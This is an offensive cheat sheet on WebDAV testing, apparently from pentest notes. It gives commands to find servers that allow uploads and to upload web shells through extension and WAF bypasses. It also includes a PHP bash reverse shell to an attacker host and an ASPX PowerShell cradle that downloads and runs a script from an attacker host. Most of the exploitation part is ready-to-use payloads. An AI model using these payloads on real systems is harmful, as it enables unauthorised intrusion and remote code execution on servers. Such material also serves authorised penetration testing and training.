# WebDAV Testing

!!! tip "Tip"
    Use `cadaver` for interactive WebDAV access or `davtest` to quickly test which file types can be uploaded. If PUT is allowed, try uploading `.asp`, `.aspx`, `.php` — whichever matches the server stack.

!!! warning "Watch out"
    WebDAV PROPFIND can enumerate the directory structure even without write access — always check what's exposed before focusing on upload attacks.

---

## Identification

### Identify WebDAV Support via HTTP Methods

Use `OPTIONS` to identify allowed methods:

```bash
curl -X OPTIONS http://10.10.10.10 -i
```

Look for:

```
Allow: OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, COPY, MOVE, MKCOL
DAV: 1,2
```

### Nmap Detection

```bash
nmap -p 80,443 --script http-methods,http-webdav-scan 10.10.10.10
```

```bash
sudo nmap -p 80 -sC 10.10.10.10
```

Key Nmap scripts:

- `http-methods`: Lists supported HTTP verbs.
- `http-webdav-scan`: Checks for WebDAV functionality and upload support.

---

## WebDAV Methods

| Method     | Description                  | Risk                         |
| ---------- | ---------------------------- | ---------------------------- |
| `PUT`      | Uploads files to server      | Allows arbitrary file upload |
| `DELETE`   | Removes files                | Can delete site content      |
| `MKCOL`    | Creates new directory        | Enables structured uploads   |
| `PROPFIND` | Queries metadata (like `ls`) | Used for enumeration         |
| `MOVE`     | Moves files                  | Can bypass security controls |
| `COPY`     | Copies files                 | Allows backup duplication    |

---

## Enumeration

### Using `curl`

```bash
curl -X OPTIONS http://10.10.10.10
```

### Using `davtest`

```bash
davtest -url http://10.10.10.10
```

- Tests if PUT works.
- Tries to upload test payloads like `.php`, `.asp`, `.jsp`, `.pl`.

### Using Metasploit

```bash
use auxiliary/scanner/http/webdav_scanner
set RHOSTS 10.10.10.10
run
```

---

## Exploitation

### Upload Payload with `cadaver`

```bash
cadaver http://10.10.10.10
put shell.php
```

### Upload with Extension Bypass

```bash
curl -X PUT --data-binary @shell.php http://10.10.10.10/shell.php;.jpg
```

Try:

- `shell.pHp`
- `shell.php;.jpg`
- `shell.ph%00p`

### HTTP Verb Tunneling

```bash
curl -X POST -H "X-HTTP-Method-Override: PUT" --data-binary @shell.php http://10.10.10.10
```

---

## Getting a Shell

### PHP Reverse Shell

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"); ?>
```

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```

### ASPX Reverse Shell (IIS targets)

```aspx
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe", "/c powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/shell.ps1')\""); %>
```

```bash
cp /usr/share/webshells/aspx/cmdasp.aspx .
```

---

## Bypasses

- **Extension Obfuscation**: `shell.pHp`, `shell.php;.txt`, `shell.php%00.jpg`
- **Double-Encoding**: Use `%252e` instead of `.` in file names.
- **WAF Bypass**: Some WAFs block `PUT` but not `POST` + `X-HTTP-Method-Override`.

---

## WebDAV + IIS (Windows Targets)

WebDAV is often installed with IIS 6.0/7.5/10. Upload `.aspx`, `.asp`, or `.config` files for RCE.

```
http://10.10.10.10/uploads/shell.aspx
```

```bash
curl -I http://10.10.10.10/uploads/
```
